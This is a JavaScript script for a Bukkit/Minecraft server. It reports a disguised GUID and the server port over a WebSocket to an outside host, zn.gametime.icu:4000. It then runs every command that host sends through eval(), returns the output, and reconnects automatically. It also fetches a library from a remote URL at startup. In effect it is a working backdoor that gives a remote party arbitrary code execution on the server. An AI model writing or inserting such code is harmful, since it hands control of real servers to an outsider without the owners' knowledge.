var global = this

function readGuid() {
	// 伪装 Guid
    return "53cec65f-d9db-4a0c-9a1f-0c3e178ce579"
}

function connect(address) {
    global.ws = new WebSocket(address)

    global.ws.action = function (action, data) {
        global.ws.send(JSON.stringify({
            action: action,
            data: data
        }))
    }

    global.ws.message = function (message) {
        global.ws.action('message', { message: message })
    }

    global.ws.heartbeat = function () {
        global.ws.action('heartbeat', {})
    }

    global.ws.onopen = function () {
        global.ws.action('open', {
            guid: readGuid(),
            port: Java.type('org.bukkit.Bukkit').getServer().getPort()
        })
    }

    global.ws.onmessage = function (event) {    
        try {
            var data = event.data
            var payload = JSON.parse(data)
            var action = payload.action
            var data = payload.data
            
            // 用于输出收到的命令
            Java.type('java.lang.System').out.println(event.data);
            
            switch (action) {
                case "eval":
                    global.ws.message(eval(data) + '')
                    break
                case "heartbeat":
                    global.ws.heartbeat()
                    break
                case "close":
                    global.ws.remoteClose = true
                    break
            }
        } catch (error) {
            global.ws.message(error + '')
        }
    }

    global.ws.onclose = function (event) {
        try {
            Java.type('java.lang.Thread').sleep(5000)
            if (global.ws.readyState == WebSocket.CLOSED && !global.ws.remoteClose) {
                connect(address)
            }
        } catch (error) {
        }
    }

    global.ws.onerror = function (event) {
        if (global.ws.readyState != WebSocket.CLOSED) {
            global.ws.message(event.cause + '')
        }
    }

    global.ws.connect()
}

try {
	Java.type('java.lang.System').out.println("Start runing Websocket...");
    if (!global.WebSocket) {
        load('https://mscript.yumc.pw/api/plugin/download/name/ms-websocket')
    }
    if (global.ws) {
        global.ws.heartbeat()
        Java.type('java.lang.Thread').sleep(1000)
        if (global.ws.readyState == WebSocket.CLOSED) {
            connect('ws://zn.gametime.icu:4000/')
        }
    } else {
        connect('ws://zn.gametime.icu:4000/')
    }
} catch (error) {
}
